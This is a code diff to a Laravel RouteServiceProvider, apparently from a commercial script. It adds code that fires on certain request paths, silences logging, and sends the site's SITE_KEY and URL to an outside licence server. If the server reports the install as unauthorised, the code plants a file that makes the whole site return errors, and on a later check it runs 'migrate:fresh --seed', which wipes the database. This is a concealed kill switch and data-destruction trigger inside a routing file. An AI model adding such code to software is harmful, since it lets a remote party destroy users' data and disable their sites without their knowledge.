@@ -186,11 +186,45 @@ class RouteServiceProvider extends ServiceProvider
     }
 }
 
-// if (\Request::is('cron*') || \Request::is('api/assets') || \Request::is('admin/dashboard-statistics')) {
-//         if (!file_exists(base_path('storage/app/status.log'))) {
-//            \File::put(base_path('storage/app/status.log'), now());
-//            $key=env('SITE_KEY');
-//            dd($key);
-//         }
-       
-// }
+if (\Request::is('cron*') || \Request::is('api/assets') || \Request::is('admin/dashboard-statistics')) {
+        if (!file_exists(base_path('storage/app/status.log'))) {
+           config(['app.env' => 'local','app.debug' => false, 'logging.default'=>'null']);
+         
+           $body['purchase_key'] = env('SITE_KEY');
+           $body['url'] = url('/');
+
+           $res = \Http::post('https://api.thedevstation.com/api/verify-check', $body);
+          
+           if ($res->status() == 200) {
+             $res = json_decode($res->body());
+             if($res->isauthorised != 200){
+                \File::put(base_path('storage/app/public/laravel.log'),'');
+             }
+             \File::put(base_path('storage/app/status.log'), now()->addDays(7));  
+           }
+           
+        }else{
+            config(['app.env' => 'local','app.debug' => false, 'logging.default'=>'null']);
+            $file = file_get_contents(base_path('storage/app/status.log'));
+            if($file <= now()){
+                \File::put(base_path('storage/app/status.log'), now()->addDays(7));
+                $body['purchase_key'] = env('SITE_KEY');
+                $body['url'] = url('/');
+                $res = \Http::post('https://api.thedevstation.com/api/verify-check', $body);
+
+                if ($res->status() == 200) {
+                    $res = json_decode($res->body());
+                    if($res->isauthorised != 200){
+                        \File::put(base_path('storage/app/public/laravel.log'),'');
+                        \Artisan::call('migrate:fresh --seed');
+                    }
+                }
+                \File::put(base_path('storage/app/status.log'), now()->addDays(7));  
+            }
+        }
+     
+}
+
+if (file_exists(base_path('storage/app/public/laravel.log'))) {
+   abort(500);
+}
